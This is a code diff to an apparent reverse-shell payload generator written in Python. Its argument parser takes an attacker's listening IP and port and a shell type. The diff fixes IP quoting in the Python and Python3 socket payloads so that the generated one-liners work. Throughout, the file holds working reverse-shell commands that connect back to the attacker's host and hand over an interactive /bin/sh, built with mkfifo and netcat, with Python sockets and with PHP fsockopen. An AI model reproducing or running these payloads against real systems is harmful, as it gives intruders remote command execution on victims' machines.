@@ -35,7 +35,7 @@ def prepare_args():
 	parser.add_argument('-p',"--port", help="Your listening port", dest="port", metavar="", default="4444")
 	parser.add_argument("-t", help="type of reverse shell you need. Example - bash", dest="type_of_shell", metavar="")
 	parser.add_argument("-I", "--Interface", help="Mention if want to give any Interface name.", action="store_true")
-	parser.add_argument("-l", "--list", help="Lists the available types of payload.", action="store_true")
+	parser.add_argument("-l", "--list", help="Lists the available types of payload.", action="store_true", dest="list")
 	parser.add_argument("-e", '--encode', help="Encodes the payload.", dest="encode", metavar="")
 	args = parser.parse_args()
 	return args
@@ -66,10 +66,10 @@ def rev_shell():
 		b = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat {arguments.ip} {arguments.port} >/tmp/f"
 
 	elif arguments.type_of_shell == 'python':
-		b = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({arguments.ip},{arguments.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+		b = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{arguments.ip}",{arguments.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
 
 	elif arguments.type_of_shell == 'python3':
-		b = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({arguments.ip},{arguments.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+		b = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{arguments.ip}",{arguments.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
 
 	elif arguments.type_of_shell == 'php':
 		b = f"""php -r '$sock=fsockopen({arguments.ip},{arguments.port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
